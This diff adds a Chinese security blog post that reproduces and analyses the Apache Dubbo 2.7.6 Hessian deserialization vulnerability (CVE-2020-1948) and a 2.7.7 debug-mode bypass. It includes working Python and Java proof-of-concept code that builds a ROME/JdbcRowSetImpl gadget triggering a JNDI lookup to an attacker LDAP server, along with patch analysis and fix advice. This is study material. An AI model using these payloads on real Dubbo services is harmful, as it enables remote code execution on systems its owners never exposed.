@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html lang="zh_cn">
+
+<head>
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="chrome=1">
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="referrer" content="no-referrer">
+<meta name="description" content="一个孤独散步者的梦">
+
+
+<meta property="twitter:title" content="Apache Dubbo 2.7.6 反序列化漏洞复现及分析">
+
+    <meta property="twitter:card" content="summary">
+
+<meta property="twitter:description" content="">
+
+<title>
+
+
+     诗与胡说 - Apache Dubbo 2.7.6 反序列化漏洞复现及分析 
+
+</title>
+<link rel="canonical" href="https://kylingit.com/blog/apache-dubbo-2.7.6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/">
+
+
+<link rel="stylesheet" href="https://kylingit.com/css/main.v0.9.1.css">
+<link rel="stylesheet" href="https://kylingit.com/css/ionicons.min.css">
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/highlight.min.css">
+
+
+
+  <link rel="stylesheet" href="https://kylingit.com/css/progressively.min.css">
+
+
+
+
+
+<link rel="shortcut icon"
+
+    href="https://kylingit.com/img/favicon.png"
+
+>
+
+
+
+
+</head>
+
+
+<body>
+
+
+<section class="header">
+
+    <div class="container">
+        <a href="https://kylingit.com/"><img class="logo" src="https://kylingit.com/img/logo.jpg" alt="logo" /></a>
+        <div class="content">
+            <a href="https://kylingit.com/"><div class="name"><h1>诗与胡说</h1></div></a>
+            <nav>
+                <ul>
+                    
+                        <a href="https://kylingit.com/blog/"><li>Blog</li></a>
+                    
+                    
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/about"><li>about</li></a>
+                            
+                        
+                    
+                        
+                            
+                        
+                    
+                        
+                            
+                            <a href="https://kylingit.com/projects"><li>projects</li></a>
+                            
+                        
+                    
+                    
+                        
+                            <a href="https://kylingit.com/notes/"><li>notes</li></a>
+                        
+                    
+                        
+                    
+                </ul>
+            </nav>
+        </div>
+    </div>
+</section>
+
+
+<section class="main post non-narrow zero-top-spacing">
+    <div class="container">
+        <div class="content">
+            <div class="front-matter">
+                <div class="title-container">
+                    <div class="page-heading">
+
+    Apache Dubbo 2.7.6 反序列化漏洞复现及分析
+
+</div>
+
+                </div>
+                <div class="meta">
+                    <div class="date" title="Wed Jul 1 2020 19:59:26 UTC">Jul 01, 2020</div>
+                    <div class="reading-time"><div class="middot"></div>2 minutes read</div>
+                </div>
+            </div>
+            <div class="markdown">
+                
+    
+    
+
+<script src="https://blog-1252261399.cos-website.ap-beijing.myqcloud.com/pangu.js"></script>
+
+<h2 id="简介">简介</h2>
+
+<ol>
+<li><p>Dubbo 从大的层面上将是RPC框架，负责封装RPC调用，支持很多RPC协议</p></li>
+
+<li><p>RPC协议包括了dubbo、rmi、hessian、webservice、http、redis、rest、thrift、memcached、jsonrpc等</p></li>
+
+<li><p>Java中的序列化有Java原生序列化、Hessian 序列化、Json序列化、dubbo 序列化</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/t01dd60f99ea19aec96.jpg" alt="img" /></p></li>
+</ol>
+
+<p>图片来源：<a href="https://www.anquanke.com/post/id/209251">https://www.anquanke.com/post/id/209251</a></p>
+
+<h2 id="环境搭建">环境搭建</h2>
+
+<ol>
+<li><p>克隆项目</p>
+
+<ul>
+<li>git clone <a href="https://github.com/apache/dubbo-spring-boot-project.git">https://github.com/apache/dubbo-spring-boot-project.git</a></li>
+<li>git checkout 2.7.6</li>
+</ul></li>
+
+<li><p>添加rome依赖</p>
+
+<p>dubbo-spring-boot-samples 文件夹，在provider-sample文件夹下的 pom 里添加</p>
+
+<pre><code>&lt;dependency&gt;
+    &lt;groupId&gt;com.rometools&lt;/groupId&gt;
+    &lt;artifactId&gt;rome&lt;/artifactId&gt;
+    &lt;version&gt;1.7.0&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre></li>
+
+<li><p>启动服务端</p>
+
+<pre><code>org.apache.dubbo.spring.boot.demo.provider.bootstrap.DubboAutoConfigurationProviderBootstrap
+</code></pre></li>
+</ol>
+
+<h2 id="复现">复现</h2>
+
+<h3 id="python版本">python版本</h3>
+
+<pre><code class="language-python"># -*- coding: utf-8 -*-
+# Ruilin
+# pip3 install dubbo-py
+from dubbo.codec.hessian2 import Decoder,new_object
+from dubbo.client import DubboClient
+ 
+client = DubboClient('192.168.2.1', 12345)
+ 
+JdbcRowSetImpl=new_object(
+    'com.sun.rowset.JdbcRowSetImpl',
+    dataSource=&quot;ldap://192.168.2.2:1389/nnyvbt&quot;,
+    strMatchColumns=[&quot;foo&quot;]
+    )
+JdbcRowSetImplClass=new_object(
+    'java.lang.Class',
+    name=&quot;com.sun.rowset.JdbcRowSetImpl&quot;,
+    )
+toStringBean=new_object(
+    'com.rometools.rome.feed.impl.ToStringBean',
+    beanClass=JdbcRowSetImplClass,
+    obj=JdbcRowSetImpl
+    )
+ 
+resp = client.send_request_and_return_response(
+    service_name='any_name',
+    method_name='any_method',
+    args=[toStringBean])
+    
+print(resp)
+</code></pre>
+
+<h3 id="java版本">java版本</h3>
+
+<ol>
+<li><p><code>DemoService</code>增加接口方法</p>
+
+<pre><code class="language-java">String rceTest(Object o);
+</code></pre></li>
+
+<li><p><code>DefaultDemoService</code>实现接口方法</p>
+
+<pre><code class="language-java">@Override
+public String rceTest(Object o) {
+    return &quot;pwned&quot;;
+}
+</code></pre></li>
+
+<li><p><code>DubboAutoConfigurationConsumerBootstrap</code>客户端增加调用</p>
+
+<pre><code class="language-java">public ApplicationRunner runner() throws Exception {
+    Object o = getPayload();
+    return args -&gt; logger.info(demoService.rceTest(o));
+}
+    
+private static Object getPayload() throws Exception {
+    String jndiUrl = &quot;ldap://192.168.3.104:1389/sg56vh&quot;;
+    
+    ToStringBean bean = new ToStringBean(JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(jndiUrl));
+    EqualsBean root = new EqualsBean(ToStringBean.class, bean);
+    
+    return JDKUtil.makeMap(root, root);
+}
+</code></pre></li>
+
+<li><p>运行provider服务者，再运行consumer消费者，触发漏洞</p></li>
+</ol>
+
+<p>流量</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200629170736311.png" alt="image-20200629170736311" /></p>
+
+<p><code>0xdabb</code>开头的为dubbo流量，提出后可以直接用socket发送触发漏洞</p>
+
+<h2 id="分析">分析</h2>
+
+<h3 id="python版本触发点">python版本触发点</h3>
+
+<pre><code>org.apache.dubbo.rpc.protocol.dubbo.DubboCodec.decodeBody()
+org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation.decode()
+org.apache.dubbo.rpc.protocol.dubbo.CallbackServiceCodec.decodeInvocationArgument()
+org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol.getInvoker()
+java.lang.StringBuilder.append()
+java.lang.String.valueOf()
+org.apache.dubbo.rpc.RpcInvocation.toString()
+com.rometools.rome.feed.impl.ToStringBean.toString()
+com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
+com.sun.rowset.JdbcRowSetImpl.connect()
+javax.naming.InitialContext.lookup()
+</code></pre>
+
+<p>python版本poc成功触发的关键点在于，通过构造一个不存在的<code>service_name</code>使得服务端获取不到期望的DubboExporter进而抛出异常，而在输出异常信息的时候进行了字符串拼接进而调用了隐含的toString方法，所以能够通过构造的恶意对象的toString方法触发漏洞</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200630134254690.png" alt="image-20200630134254690" /></p>
+
+<p>那么关键点就在异常处理部分了，也正是rui0提出的“后反序列化漏洞”的利用场景，重点来看一下</p>
+
+<p><code>org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol.getInvoker()</code></p>
+
+<pre><code class="language-java">//dubbo 2.7.3
+if (exporter == null) {
+    throw new RemotiyicngException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + inv);
+} else {
+    return exporter.getInvoker();
+}
+</code></pre>
+
+<p>dubbo 2.7.3版本中，抛出异常部分直接拼接了inv，此时inv为<code>DecodeableRpcInvocation</code>对象，并且<code>arguments</code>值为我们设置的<code>ToStringBean</code>对象，在对其直接进行字符串拼接时会触发String.append-&gt;String.valueOf-&gt;obj.toString()，进而将<code>ToStringBean</code>进行tostring触发漏洞</p>
+
+<p>而在2.7.5之后的版本中，throw RemotiyicngException部分变成了</p>
+
+<pre><code class="language-java">//dubbo 2.7.5
+if (exporter == null) {
+    throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + this.getInvocationWithoutData(inv));
+} else {
+    return exporter.getInvoker();
+}
+</code></pre>
+
+<p>注意到对inv经过了<code>getInvocationWithoutData</code>处理，这个处理是这样的：</p>
+
+<pre><code class="language-java">//org.apache.dubbo.rpc.protocol.dubbo.DubboProtocol
+private Invocation getInvocationWithoutData(Invocation invocation) {
+    if (this.logger.isDebugEnabled()) {
+        return invocation;
+    } else if (invocation instanceof RpcInvocation) {
+        RpcInvocation rpcInvocation = (RpcInvocation)invocation;
+        rpcInvocation.setArguments((Object[])null);
+        return rpcInvocation;
+    } else {
+        return invocation;
+    }
+}
+</code></pre>
+
+<p>可以看到将invocation中的<code>arguments</code>值处理成了空，经过这个处理之后后续的toString利用链就无法继续下去，起到了第一层防御效果，因此通过设置<code>arguments</code>为恶意对象的方法就无法在2.7.5版本以上触发。</p>
+
+<p>相关commit可以在<a href="https://github.com/apache/dubbo/commit/5618b12340b9c3ecf90c7e01c274a4f094cc146c#diff-37a8a427d2ec646f392ebd9225019346">这里</a>看到</p>
+
+<h3 id="java版本触发点">Java版本触发点</h3>
+
+<pre><code>org.apache.dubbo.remoting.transport.DecodeHandler.decode()
+org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation.decode()
+org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectInput.readObject()
+com.alibaba.com.caucho.hessian.io.Hessian2Input.readObject()
+com.alibaba.com.caucho.hessian.io.MapDeserializer.readMap()
+com.alibaba.com.caucho.hessian.io.MapDeserializer.doReadMap()
+java.util.HashMap.put()-&gt;hash()-&gt;hashCode()
+com.rometools.rome.feed.impl.EqualsBean.beanHashCode()
+com.rometools.rome.feed.impl.ToStringBean.toString()
+com.sun.rowset.JdbcRowSetImpl.getDatabaseMetaData()
+com.sun.rowset.JdbcRowSetImpl.connect()
+javax.naming.InitialContext.lookup()
+</code></pre>
+
+<p>下面讨论一下java版本poc为什么在解决了异常处理的toString后还是能触发漏洞？</p>
+
+<p>除了上面的commit修复了异常处理中的toString外，官方还提交了一个<a href="https://github.com/apache/dubbo/commit/04fc3ce4cc87b9bd09546c12df3f8762b9525da9#diff-97efdee63a15983753ec52d8cd03b6a7">PR</a></p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701113514058.png" alt="image-20200701113514058" /></p>
+
+<p>在<code>org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation.decode()</code>中增加了<code>RpcUtils.isGenericCall</code>和<code>RpcUtils.isEcho</code>的判断，在没有补丁之前，pts还能通过反射从desc中获取到，而打了补丁后，如果方法名不是<code>$invoke</code>或<code>$invokeAsync</code>或<code>$echo</code>则直接抛出Service not found，因此当用python版本poc发送不存在的service_name或method_name时，便通不过判断，也就无法利用。</p>
+
+<p>上述判断条件是当传入的参数类别从对应的方法中获取不到的时候进行的，那么如果我们传入正确的方法名和参数类型，该条件就不成立，也就不会进入<code>RpcUtils.isGenericCall</code>和<code>RpcUtils.isEcho</code>，从而绕过了对调用的方法名的判断</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701112440804.png" alt="image-20200701112440804" /></p>
+
+<p>因此我们重新实现一下客户端代码，调用正确的服务名和方法名，并传入构造的map对象，便能再次触发漏洞。</p>
+
+<p>触发条件：必须知道服务端的完整service name和方法名，同时该方法需要能接收map或object对象，客户端才能通过正确的服务名和方法名去调用，否则是无法触发的。</p>
+
+<h3 id="2-7-7绕过">2.7.7绕过</h3>
+
+<p>上面分析了CVE-2020-1948，看似补丁修复了漏洞，但之后又有讨论说在2.7.7上又存在绕过，下面也来分析一下</p>
+
+<p>还是看<code>getInvocationWithoutData</code>方法，注意到在设置<code>arguments</code>为空之前有这么两行代码</p>
+
+<pre><code class="language-java">if (this.logger.isDebugEnabled()) {
+    return invocation;
+}
+</code></pre>
+
+<p>这就是说如果provider是以debug模式启动的，那么会直接返回<code>invocation</code>对象。。。</p>
+
+<p>配置一下服务端启动的日志级别，然后修改python版本poc的<code>method_name</code>为<code>$invoke</code>，成功绕过2.7.7补丁（还需要注意服务名是否匹配和服务版本号的问题）</p>
+
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;configuration scan=&quot;true&quot;&gt;
+    &lt;logger name=&quot;com.alibaba.dubbo&quot; level=&quot;DEBUG&quot;/&gt;
+&lt;/configuration&gt;
+</code></pre>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701191029066.png" alt="image-20200701191029066" /></p>
+
+<h3 id="小结">小结</h3>
+
+<p>上面两种触发方式是不一样的，一个是利用异常处理中存在设计不足，使得可以执行用户可控参数的toString方法，也即“后反序列化”利用思路，另一个是直接反序列化hessian2数据，期间对hashmap的操作进入toString，从调用栈上也能看出两者的区别。</p>
+
+<h2 id="修复方式">修复方式</h2>
+
+<p>按照<a href="https://github.com/apache/dubbo/pull/6374">dubbo/pull/6374</a>建议的方法，给<code>ParameterTypesDesc</code>加上校验，严格限制类型为<code>Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;</code>，同时建议参考<a href="https://github.com/sofastack/sofa-hessian">sofa-hessian</a>给反序列化加上黑名单</p>
+
+<p><img src="https://blog-1252261399.cos.ap-beijing.myqcloud.com/images/image-20200701192122667.png" alt="image-20200701192122667" /></p>
+
+<h2 id="参考">参考</h2>
+
+<ul>
+<li><a href="https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html">https://www.mail-archive.com/dev@dubbo.apache.org/msg06544.html</a></li>
+<li><a href="http://rui0.cn/archives/1338">http://rui0.cn/archives/1338</a></li>
+<li><a href="https://www.anquanke.com/post/id/197658">https://www.anquanke.com/post/id/197658</a></li>
+<li><a href="https://github.com/apache/dubbo/pull/6374">https://github.com/apache/dubbo/pull/6374</a></li>
+</ul>
+
+<script>pangu.spacingPage();</script>
+
+
+                <br>
+                <p><a href="https://kylingit.com/blog">Back to posts</a></p>
+            </div>
+            <br>
+            <div class="disqus">
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'kylingit';
+    var disqus_identifier = 'https:\/\/kylingit.com\/blog\/apache-dubbo-2.7.6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90\/';
+    var disqus_title = 'Apache Dubbo 2.7.6 反序列化漏洞复现及分析';
+    var disqus_url = 'https:\/\/kylingit.com\/blog\/apache-dubbo-2.7.6-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90\/';
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </div>
+        </div>
+    </div>
+</section>
+
+<section class="footer">
+    <div class="container">
+        <div class="copyright">
+
+        
+            <a href="https://kylingit.com/license">Copyright © 2020 kylinking</a>
+        
+
+        </div>
+        <div class="icons">
+
+        
+            <a href="https://github.com/kylingit" target="_blank">
+                <i class="icon ion-social-github" title="github"></i>
+            </a>
+        
+
+        
+
+        
+
+        
+            <a href="mailto:ikylinking@gmail.com">
+                <i class="icon ion-ios-email larger" title="email"></i>
+            </a>
+        
+
+        
+            <a href="https://kylingit.com/index.xml">
+                <i class="icon ion-social-rss larger" title="rss"></i>
+            </a>
+        
+
+        </div>
+    </div>
+</section>
+
+
+  <script src="https://kylingit.com/js/highlight.min.js" defer></script>
+  
+
+
+
+  <script src="https://kylingit.com/js/progressively.min.js" defer></script>
+
+
+<script>
+  window.onload = function() {
+    
+      hljs.initHighlighting();
+    
+    
+      progressively.init({delay: 30, throttle: 50});
+    
+  };
+</script>
+
+</body>
+</html>
+
